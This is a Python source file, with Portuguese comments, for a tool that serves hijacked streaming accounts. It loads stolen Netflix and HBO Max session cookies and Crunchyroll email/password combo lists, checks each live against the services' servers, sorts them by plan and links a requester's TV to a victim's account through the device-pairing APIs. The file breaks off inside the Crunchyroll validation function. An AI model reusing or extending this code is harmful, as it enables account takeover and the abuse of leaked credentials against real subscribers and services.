import os
import re
import json
import glob
import random
import uuid
import base64
import urllib3
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import socketserver
import hmac
import secrets
import threading
import time
import concurrent.futures
from datetime import datetime
from typing import Dict, Optional, Tuple, List, Set

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurações de Pastas
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
NETFLIX_COOKIES_FOLDER = os.path.join(BASE_DIR, "netflix")
HBO_COOKIES_FOLDER = os.path.join(BASE_DIR, "hbomax")
CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
USED_REGISTRY_FILE = os.path.join(BASE_DIR, "used_cookies.json")
COOKIES_BUNDLE_FILE = os.path.join(BASE_DIR, "cookies_bundle.json")
PORT = int(os.environ.get("PORT", 5000))
SERVER_DATA_VERSION = time.time()

def sync_cookies_bundle():
    """Garante suporte total às pastas netflix, hbomax e combo."""
    os.makedirs(NETFLIX_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(HBO_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)
    
    # Migra automaticamente arquivos antigos se existirem
    old_netflix = os.path.join(BASE_DIR, "cookies")
    old_hbo = os.path.join(BASE_DIR, "cookies 01")
    if os.path.exists(old_netflix):
        for f in glob.glob(os.path.join(old_netflix, "*.*")):
            dest = os.path.join(NETFLIX_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    if os.path.exists(old_hbo):
        for f in glob.glob(os.path.join(old_hbo, "*.*")):
            dest = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    # 1. Se o bundle existir, restaura as pastas no servidor
    if os.path.exists(COOKIES_BUNDLE_FILE):
        try:
            with open(COOKIES_BUNDLE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
            
            for fname, content in data.get("netflix", {}).items():
                dest = os.path.join(NETFLIX_COOKIES_FOLDER, fname)
                if not os.path.exists(dest):
                    with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                        out.write(content)
                        
            for fname, content in data.get("hbo", {}).items():
                dest = os.path.join(HBO_COOKIES_FOLDER, fname)
                if not os.path.exists(dest):
                    with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                        out.write(content)

            for fname, content in data.get("crunchyroll", {}).items():
                dest = os.path.join(CRUNCHYROLL_COMBO_FOLDER, fname)
                if not os.path.exists(dest):
                    with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                        out.write(content)
        except Exception:
            pass

    # 2. Salva todos os cookies locais no arquivo único cookies_bundle.json
    bundle = {"netflix": {}, "hbo": {}, "crunchyroll": {}}
    for n_dir in [NETFLIX_COOKIES_FOLDER, old_netflix]:
        if os.path.exists(n_dir):
            for f in glob.glob(os.path.join(n_dir, "*.txt")) + glob.glob(os.path.join(n_dir, "*.json")):
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as inf:
                        bundle["netflix"][os.path.basename(f)] = inf.read()
                except Exception:
                    pass

    for h_dir in [HBO_COOKIES_FOLDER, old_hbo]:
        if os.path.exists(h_dir):
            for f in glob.glob(os.path.join(h_dir, "*.txt")) + glob.glob(os.path.join(h_dir, "*.json")):
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as inf:
                        bundle["hbo"][os.path.basename(f)] = inf.read()
                except Exception:
                    pass

    if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
        for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
            try:
                with open(f, 'r', encoding='utf-8', errors='ignore') as inf:
                    bundle["crunchyroll"][os.path.basename(f)] = inf.read()
            except Exception:
                pass

    if bundle["netflix"] or bundle["hbo"] or bundle["crunchyroll"]:
        try:
            with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as outf:
                json.dump(bundle, outf)
        except Exception:
            pass

sync_cookies_bundle()

# Cache de cookies e estados em memória
USED_NETFLIX_COOKIES: Set[str] = set()
USED_HBO_COOKIES: Set[str] = set()

# Histórico
history_lock = threading.Lock()

def load_history() -> List[dict]:
    with history_lock:
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        return data
            except Exception:
                pass
        return []

def record_history_entry(service: str, filename: str, email: str, tv_code: str, plan: str = "", status: str = "Sucesso"):
    with history_lock:
        history = []
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        history = data
            except Exception:
                history = []
        
        history.insert(0, {
            "service": service,
            "filename": os.path.basename(filename) if filename else "cookie",
            "email": email,
            "tv_code": tv_code,
            "plan": plan,
            "status": status,
            "used_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        })

        try:
            with open(USED_REGISTRY_FILE, 'w', encoding='utf-8') as f:
                json.dump(history, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO NETFLIX (MOTOR PROVADO TV2.PY COM VALIDAÇÃO REAL)
# ═══════════════════════════════════════════════════════════════
import tv2

USED_NETFLIX_COOKIES = tv2.USED_COOKIES
ACTIVE_PLAN = {"netflix": "TODOS", "hbo": "TODOS", "crunchyroll": "TODOS"}

# Cache de cookies testados e validados ao vivo
VALID_NETFLIX_LOCK = threading.Lock()
VALID_NETFLIX_BY_FILE: Dict[str, dict] = {}
VALID_NETFLIX_POOL: List[dict] = []
DEAD_NETFLIX_COOKIES: Set[str] = set()
COOKIE_FAIL_COUNTS: Dict[str, int] = {}

# HBO Valid Pool
VALID_HBO_LOCK = threading.Lock()
VALID_HBO_BY_FILE: Dict[str, dict] = {}
VALID_HBO_POOL: List[dict] = []

def get_netflix_files() -> List[str]:
    return tv2.get_available_cookie_files()

def classify_plan(filename: str, plan_text: str = "") -> str:
    combined = f"{filename} {plan_text}".lower()
    if any(k in combined for k in ['premium', 'cao cấp', 'uhd', '4k', 'vip', 'مميزة']):
        return 'PREMIUM'
    elif any(k in combined for k in ['com anúncio', 'with ads', 'with advert', 'avec pub', 'mit werbung', 'con anuncios', 'con pubblicità', 'reklam']):
        return 'COM ANÚNCIOS'
    elif any(k in combined for k in ['padrão', 'standard', 'estándar', 'standart', 'tiêu chuẩn', 'fhd', '1080', 'giá chuẩn', 'standardowy', 'قياسية', 'סטנדרטית']):
        return 'PADRÃO'
    elif any(k in combined for k in ['básico', 'basic', 'basis', 'dasar', 'essentiel', 'mobile', 'podstawowy', 'أساسية']):
        return 'BÁSICO'
    return 'PADRÃO'

def test_netflix_cookie_file(fpath: str, timeout: float = 4.0) -> Optional[dict]:
    """Testa se o arquivo de cookie possui sessão real ativa na Netflix."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or fpath in DEAD_NETFLIX_COOKIES:
        return None

    with VALID_NETFLIX_LOCK:
        if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
            return VALID_NETFLIX_BY_FILE[fpath]

    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.read()
        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            DEAD_NETFLIX_COOKIES.add(fpath)
            return None

        # Validação real contra os servidores da Netflix
        acc_info = tv2.check_account(parsed, timeout=timeout)
        if not acc_info:
            # Tolerância contra rate-limit transitório de rede: não descarta sumariamente no primeiro erro
            COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
            if COOKIE_FAIL_COUNTS[fpath] >= 3:
                DEAD_NETFLIX_COOKIES.add(fpath)
            return None

        COOKIE_FAIL_COUNTS[fpath] = 0
        cat = classify_plan(bname, acc_info.get("plan", ""))
        acc_info["category"] = cat

        entry = {
            "file": fpath,
            "parsed": parsed,
            "info": acc_info,
            "validated": True
        }

        with VALID_NETFLIX_LOCK:
            VALID_NETFLIX_BY_FILE[fpath] = entry
            if not any(e["file"] == fpath for e in VALID_NETFLIX_POOL):
                VALID_NETFLIX_POOL.append(entry)

        return entry
    except Exception:
        COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
        if COOKIE_FAIL_COUNTS[fpath] >= 3:
            DEAD_NETFLIX_COOKIES.add(fpath)
        return None

def extract_netflix_file_info(fpath: str) -> Optional[dict]:
    """Extrai informações do arquivo de cookie (email, plano, país) sem travar a requisição com rede."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or fpath in DEAD_NETFLIX_COOKIES:
        return None

    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.read()

        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            return None

        email = ""
        country = "BR"
        plan = "PREMIUM"

        # 1. Regex no nome do arquivo: [BR] [email@domain.com] - Plano.txt
        fn_match = re.search(r'\[([A-Za-z]{2})\]\s*\[([^\]]+)\]\s*-\s*([^.]+)', bname)
        if fn_match:
            country = fn_match.group(1).upper()
            email = fn_match.group(2).strip()
            plan = fn_match.group(3).strip()

        # 2. Regex no conteúdo do arquivo caso o nome não tenha
        if not email:
            em_match = re.search(r'(?:📧|\bEmail\b)[\s:]*([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw, re.I)
            if em_match:
                email = em_match.group(1).strip()

        if not email:
            any_em = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw)
            if any_em:
                email = any_em.group(1).strip()
            else:
                email = bname.replace('.txt', '').replace('.json', '')

        if country == "BR":
            c_match = re.search(r'(?:🌍|\bPais\b)[\s:]*.*?\(([A-Z]{2})\)', raw, re.I)
            if c_match:
                country = c_match.group(1).upper()
            else:
                c2_match = re.search(r'Country:\s*([A-Z]{2})', raw, re.I)
                if c2_match:
                    country = c2_match.group(1).upper()

        if plan == "PREMIUM" or not plan:
            p_match = re.search(r'(?:📋|\bPlano\b)[\s:]*([^\r\n]+)', raw, re.I)
            if p_match:
                plan = p_match.group(1).strip()

        cat = classify_plan(bname, plan)

        return {
            "file": fpath,
            "parsed": parsed,
            "info": {
                "email": email,
                "country": country,
                "plan": plan,
                "category": cat
            },
            "validated": False
        }
    except Exception:
        return None

def get_all_netflix_accounts() -> List[dict]:
    """Retorna todas as contas Netflix disponíveis da pasta (deduplicadas), com metadados instantâneos."""
    files = get_netflix_files()
    accounts = []
    seen_names = set()

    for fpath in files:
        bname = os.path.basename(fpath)
        if bname in seen_names:
            continue
        seen_names.add(bname)

        if fpath in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or fpath in DEAD_NETFLIX_COOKIES:
            continue

        # Se já tiver validação ao vivo salva em cache
        with VALID_NETFLIX_LOCK:
            if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
                accounts.append(VALID_NETFLIX_BY_FILE[fpath])
                continue

        # Extração instantânea de metadados
        meta = extract_netflix_file_info(fpath)
        if meta:
            accounts.append(meta)

    return accounts

def start_background_netflix_validator():
    """Valida em segundo plano os cookies restantes da pasta de forma suave sem derrubar conexões."""
    def _worker():
        time.sleep(15)
        while True:
            files = get_netflix_files()
            for f in files:
                bname = os.path.basename(f)
                if f in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or f in DEAD_NETFLIX_COOKIES:
                    continue
                with VALID_NETFLIX_LOCK:
                    if f in VALID_NETFLIX_BY_FILE:
                        continue
                try:
                    test_netflix_cookie_file(f, timeout=3.5)
                except Exception:
                    pass
                time.sleep(3.0)
            time.sleep(180)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_netflix_validator()

def get_verified_netflix_cookies(min_count: int = 1) -> List[dict]:
    """Retorna todas as contas Netflix disponíveis."""
    return get_all_netflix_accounts()

def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = "") -> Optional[dict]:
    """Retorna o primeiro cookie válido disponível e pronto para uso."""
    # 1. Primeiro verifica os já validados no pool
    with VALID_NETFLIX_LOCK:
        for entry in VALID_NETFLIX_POOL:
            f = entry["file"]
            bname = os.path.basename(f)
            if f in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or f in DEAD_NETFLIX_COOKIES or f == exclude_file or bname == exclude_file:
                continue
            prewarm_netflix_cookie(entry)
            return entry

    # 2. Testa os arquivos disponíveis até achar o primeiro vivo
    files = get_netflix_files()
    for f in files:
        bname = os.path.basename(f)
        if f in tv2.USED_COOKIES or bname in tv2.USED_COOKIES or f in DEAD_NETFLIX_COOKIES or f == exclude_file or bname == exclude_file:
            continue
        res = test_netflix_cookie_file(f, timeout=4.0)
        if res:
            prewarm_netflix_cookie(res)
            return res

    return None

# Alias de compatibilidade
find_netflix_fast_cookie = find_netflix_valid_cookie

def select_netflix_cookie_by_filename(filename: str) -> Optional[dict]:
    """Seleciona com precisão o cookie solicitado pelo usuário."""
    fpath = os.path.join(NETFLIX_COOKIES_FOLDER, os.path.basename(filename))
    if not os.path.exists(fpath):
        # Tenta busca flexível por nome parcial / email
        for f in get_netflix_files():
            if filename in os.path.basename(f) or filename in f:
                fpath = f
                break

    if not os.path.exists(fpath):
        return None

    # Se já foi validado e está vivo no cache
    with VALID_NETFLIX_LOCK:
        if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
            return VALID_NETFLIX_BY_FILE[fpath]

    # Validação ao vivo
    res = test_netflix_cookie_file(fpath, timeout=5.0)
    if res:
        return res

    DEAD_NETFLIX_COOKIES.add(fpath)
    return None

# ═══════════════════════════════════════════════════════════════
#  ⚡ SESSÃO PRÉ-AQUECIDA PARA ATIVAÇÃO INSTANTÂNEA (<500ms)
# ═══════════════════════════════════════════════════════════════
PREWARMED_NETFLIX: Dict[str, dict] = {}
PREWARMED_LOCK = threading.Lock()

def prewarm_netflix_cookie(cookie_data: dict):
    """Pré-aquece a sessão da Netflix em background para ativação com zero delay."""
    if not cookie_data or "parsed" not in cookie_data:
        return
    fpath = cookie_data.get("file", "")
    try:
        session = tv2.get_session()
        tv2.set_cookies_on_session(session, cookie_data["parsed"])
        auth_url = tv2.extract_auth_url(session)
        if auth_url:
            with PREWARMED_LOCK:
                PREWARMED_NETFLIX[fpath] = {
                    "session": session,
                    "auth_url": auth_url,
                    "time": time.time()
                }
    except Exception:
        pass

def activate_netflix_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Ativação ultrarrápida aproveitando a sessão pré-aquecida ou fallback padrão."""
    fpath = cookie_data.get("file", "")
    prew = None
    with PREWARMED_LOCK:
        if fpath in PREWARMED_NETFLIX and (time.time() - PREWARMED_NETFLIX[fpath]["time"] < 240):
            prew = PREWARMED_NETFLIX.pop(fpath)

    if prew:
        session = prew["session"]
        auth_url = prew["auth_url"]
        ok, reason = tv2.activate_tv_code(session, tv_code, auth_url)
        if ok:
            return True, "TV pareada e ativada com sucesso na Netflix!", cookie_data.get("info")
        elif reason in ("invalid_code", "expired_code", "already_used"):
            msg_map = {
                "invalid_code": "Código inválido. Digite o código exibido na TV.",
                "expired_code": "Código expirou na TV. Gere um novo código na TV.",
                "already_used": "Código já utilizado anteriormente.",
            }
            return False, msg_map.get(reason, reason), None
        else:
            return tv2.activate_with_cookie(cookie_data, tv_code)
    else:
        return tv2.activate_with_cookie(cookie_data, tv_code)




# ═══════════════════════════════════════════════════════════════
#  LÓGICA HBO MAX
# ═══════════════════════════════════════════════════════════════
HBO_ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

COUNTRY_MAP = {
    "TR": "Turquia", "US": "Estados Unidos", "IN": "Índia",
    "GB": "Reino Unido", "FR": "França", "DE": "Alemanha",
    "ES": "Espanha", "IT": "Itália", "BR": "Brasil",
    "MX": "México", "AR": "Argentina", "CA": "Canadá",
    "AU": "Austrália", "JP": "Japão", "KR": "Coreia do Sul",
    "TH": "Tailândia", "PL": "Polônia", "CL": "Chile",
    "CO": "Colômbia", "PE": "Peru", "UY": "Uruguai"
}

def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        return None
    except Exception:
        return None

def extract_hbo_st_token(content: str) -> Optional[str]:
    match = re.search(r'^st:\s*(eyJ[A-Za-z0-9_\-\.]+)', content, re.MULTILINE)
    if match:
        return match.group(1)
    match = re.search(r'st=([^;\s]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    match = re.search(r'(eyJ[A-Za-z0-9_\-\.]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    return None

def get_hbo_region_from_jwt(st_token: str) -> str:
    decoded = decode_jwt(st_token)
    if decoded:
        sub = decoded.get('subdivision', '')
        if 'amer' in sub:
            return 'amer'
        elif 'emea' in sub:
            return 'emea'
        elif 'latam' in sub:
            return 'latam'
        elif 'apac' in sub:
            return 'apac'
    return 'amer'

def get_hbo_files() -> List[str]:
    files = []
    seen_names = set()
    for h_dir in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
        if os.path.exists(h_dir):
            for ext in ["*.txt", "*.json"]:
                for f in glob.glob(os.path.join(h_dir, ext)):
                    bname = os.path.basename(f)
                    if bname not in seen_names:
                        seen_names.add(bname)
                        files.append(os.path.abspath(f))
    return [f for f in files if f not in USED_HBO_COOKIES and os.path.basename(f) not in USED_HBO_COOKIES]

def extract_hbo_file_info(filename: str) -> Optional[dict]:
    if not os.path.exists(filename):
        return None
    bname = os.path.basename(filename)
    if filename in USED_HBO_COOKIES or bname in USED_HBO_COOKIES:
        return None
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None
        decoded = decode_jwt(st_token)
        if decoded:
            exp = decoded.get('exp', 0)
            if exp and datetime.fromtimestamp(exp) < datetime.now():
                USED_HBO_COOKIES.add(filename)
                return None
        region = get_hbo_region_from_jwt(st_token)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        return {
            "file": filename,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            },
            "validated": False
        }
    except Exception:
        return None

def get_hbo_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    try:
        res = requests.get(url, headers=headers, timeout=4, verify=False)
        if res.status_code == 200:
            return res.json()
        return None
    except Exception:
        return None

def is_hbo_free(user_data: Dict) -> bool:
    if not user_data or 'data' not in user_data:
        return True
    attrs = user_data.get('data', {}).get('attributes', {})
    if attrs.get('isFree') is True or attrs.get('isTrial') is True:
        return True
    sub_status = str(attrs.get('subscriptionStatus', '') or attrs.get('status', '') or attrs.get('accountStatus', '') or attrs.get('billingStatus', '')).lower()
    if sub_status in ['expired', 'inactive', 'canceled', 'cancelled', 'unsubscribed', 'suspended', 'past_due', 'pastdue', 'billing_issue', 'grace_period', 'hold', 'payment_failed']:
        return True
    if attrs.get('hasActiveSubscription') is False:
        return True
    return False

def get_all_hbo_accounts() -> List[dict]:
    """Retorna todas as contas HBO Max disponíveis da pasta, deduplicadas."""
    files = get_hbo_files()
    accounts = []
    seen = set()
    for filename in files:
        bname = os.path.basename(filename)
        if bname in seen:
            continue
        seen.add(bname)
        if filename in USED_HBO_COOKIES or bname in USED_HBO_COOKIES:
            continue
        with VALID_HBO_LOCK:
            if filename in VALID_HBO_BY_FILE:
                accounts.append(VALID_HBO_BY_FILE[filename])
                continue
        meta = extract_hbo_file_info(filename)
        if meta:
            accounts.append(meta)
    return accounts

def get_verified_hbo_cookies(min_count: int = 1) -> List[dict]:
    """Retorna a lista de contas HBO Max disponíveis."""
    return get_all_hbo_accounts()

def find_hbo_valid_cookie() -> Optional[dict]:
    with VALID_HBO_LOCK:
        for entry in VALID_HBO_POOL:
            f = entry["file"]
            if f not in USED_HBO_COOKIES and os.path.basename(f) not in USED_HBO_COOKIES:
                return entry

    files = get_hbo_files()
    for filename in files:
        if filename in USED_HBO_COOKIES or os.path.basename(filename) in USED_HBO_COOKIES:
            continue
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            st_token = extract_hbo_st_token(content)
            if not st_token:
                USED_HBO_COOKIES.add(filename)
                continue
            decoded = decode_jwt(st_token)
            if decoded:
                exp = decoded.get('exp', 0)
                if exp and datetime.fromtimestamp(exp) < datetime.now():
                    USED_HBO_COOKIES.add(filename)
                    continue
            region = get_hbo_region_from_jwt(st_token)
            user_data = get_hbo_user_info(st_token, region)
            if not user_data or is_hbo_free(user_data):
                USED_HBO_COOKIES.add(filename)
                continue

            attrs = user_data.get('data', {}).get('attributes', {})
            email = attrs.get('username', '') or attrs.get('email', 'Usuario_HBO')
            if email and '@' not in email:
                email = f"{email}@hbomax.com"
            raw_country = attrs.get('verifiedHomeTerritory', 'BR')
            country = COUNTRY_MAP.get(raw_country, raw_country)
            tier = attrs.get('tier', '') or attrs.get('productType', '') or "PREMIUM"
            plan = f"HBO Max {tier.upper()}"

            entry = {
                "file": filename,
                "st_token": st_token,
                "region": region,
                "info": {
                    "email": email,
                    "plan": plan,
                    "country": country,
                    "region": region.upper()
                },
                "validated": True
            }
            with VALID_HBO_LOCK:
                VALID_HBO_BY_FILE[filename] = entry
                if not any(e["file"] == filename for e in VALID_HBO_POOL):
                    VALID_HBO_POOL.append(entry)
            return entry
        except Exception:
            USED_HBO_COOKIES.add(filename)
            continue
    return None

def activate_hbo_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    clean_code = re.sub(r'[^0-9]', '', tv_code)
    if len(clean_code) != 6:
        return False, "O código HBO Max deve conter exatamente 6 dígitos numéricos (ex: 123456).", None

    if not cookie_data:
        return False, "Nenhum cookie HBO Max selecionado.", None

    st_token = cookie_data["st_token"]
    region = cookie_data["region"]
    filename = cookie_data["file"]

    device_id = str(uuid.uuid4())
    device_info = {
        "deviceId": device_id,
        "deviceName": "Chrome",
        "deviceModel": "Windows",
        "deviceType": "BROWSER",
        "osVersion": "10.0.0",
        "appVersion": "7.4.0",
        "manufacturer": "Google",
        "screenWidth": 1920,
        "screenHeight": 1080,
        "language": "pt-BR",
        "timezone": "America/Sao_Paulo"
    }
    device_info_b64 = base64.b64encode(json.dumps(device_info).encode()).decode()
    client_id = f"web_{uuid.uuid4().hex[:16]}"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId={client_id}",
        "x-disco-device-info": device_info_b64,
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "pt-BR,pt",
        "x-wbd-time-zone": "America/Sao_Paulo",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    payload = {"linkingCode": clean_code}
    try:
        val_url = HBO_ENDPOINTS[region]["validate"]
        con_url = HBO_ENDPOINTS[region]["connect"]
        r1 = requests.post(val_url, headers=headers, json=payload, timeout=15, verify=False)
        if r1.status_code in [200, 204]:
            r2 = requests.post(con_url, headers=headers, json=payload, timeout=15, verify=False)
            if r2.status_code in [200, 204]:
                USED_HBO_COOKIES.add(filename)
                record_history_entry("HBO Max", filename, cookie_data["info"]["email"], clean_code, cookie_data["info"]["plan"], "Sucesso")
                return True, "TV pareada e ativada com sucesso na HBO Max!", cookie_data["info"]
            else:
                USED_HBO_COOKIES.add(filename)
                return False, "Falha na etapa de conexão final com a TV na HBO Max.", None
        else:
            if r1.status_code == 400:
                try:
                    err = r1.json()
                    err_code = err.get('errors', [{}])[0].get('code', '')
                    if err_code == 'invalid.code':
                        return False, f"O código '{clean_code}' é inválido. Digite o código exibido na TV.", None
                    elif err_code == 'expired.code':
                        return False, f"O código '{clean_code}' expirou na TV. Gere um novo código de 6 dígitos.", None
                except Exception:
                    pass
            USED_HBO_COOKIES.add(filename)
            return False, "A sessão deste cookie HBO Max expirou. Próximo cookie pronto!", None
    except Exception as e:
        USED_HBO_COOKIES.add(filename)
        return False, f"Erro de conexão com os servidores da HBO Max: {str(e)}", None

def select_hbo_cookie_by_filename(filename: str) -> Optional[dict]:
    fpath = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(filename))
    if not os.path.exists(fpath):
        return None
    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None

        bname = os.path.basename(fpath)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        region = get_hbo_region_from_jwt(st_token)

        user_data = get_hbo_user_info(st_token, region)
        if user_data:
            attrs = user_data.get('data', {}).get('attributes', {})
            real_email = attrs.get('username', '') or attrs.get('email', '')
            if real_email:
                email = real_email
            raw_country = attrs.get('verifiedHomeTerritory', country)
            country = COUNTRY_MAP.get(raw_country, raw_country)
            tier = attrs.get('tier', '') or attrs.get('productType', '') or "PREMIUM"
            plan = f"HBO Max {tier.upper()}"

        return {
            "file": fpath,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            }
        }
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO CRUNCHYROLL (MOTOR COMBO & TV ACTIVATION REAL)
# ═══════════════════════════════════════════════════════════════
import crunchyroll

CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)

VALID_CRUNCHYROLL_LOCK = threading.Lock()
VALID_CRUNCHYROLL_BY_EMAIL: Dict[str, dict] = {}
VALID_CRUNCHYROLL_POOL: List[dict] = []
DEAD_CRUNCHYROLL_ACCOUNTS: Set[str] = set()
USED_CRUNCHYROLL_ACCOUNTS = crunchyroll.USED_COMBOS

def get_all_crunchyroll_accounts() -> List[dict]:
    """Retorna todas as contas Crunchyroll dos combos com metadados rápidos."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    accounts = []
    seen = set()

    for email, pwd, fname in combos:
        if email in seen:
            continue
        seen.add(email)

        if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
            continue

        with VALID_CRUNCHYROLL_LOCK:
            if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
                accounts.append(VALID_CRUNCHYROLL_BY_EMAIL[email])
                continue

        accounts.append({
            "file": fname,
            "email": email,
            "password": pwd,
            "info": {
                "email": email,
                "plan": "Crunchyroll VIP",
                "country": "BR"
            },
            "validated": False
        })
    return accounts

def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]:
    """Valida ao vivo uma conta Crunchyroll nos servidores oficiais."""
